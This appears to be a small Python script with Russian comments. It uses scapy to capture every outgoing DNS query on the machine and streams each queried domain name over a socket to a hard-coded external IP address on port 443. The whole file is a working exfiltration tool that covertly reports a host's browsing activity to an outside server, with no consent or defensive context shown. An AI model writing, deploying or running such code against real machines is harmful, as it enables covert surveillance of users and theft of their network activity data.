import socket
from scapy.all import sniff

SERVER_ADDRESS = ('34.147.91.248', 443)
try:
    # Создание сокета
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    print(f"Attempting to connect to {SERVER_ADDRESS}...")
    sock.settimeout(10)  # Установите таймаут
    sock.connect(SERVER_ADDRESS)
    print("Connection established.")
except Exception as e:
    print(f"An error occurred: {e}")

def packet_sniff(packet):
    qname = packet['DNS Question Record'].qname.decode()
    print(f'Запрос: {qname[0:-1]}')
    msg = str(qname[0:-1])
    sock.send(bytes(msg, encoding='utf8'))


def main():
    sniff(filter='dst port 53', count=0, store=False, prn=packet_sniff)


if __name__ == "__main__":
    main()
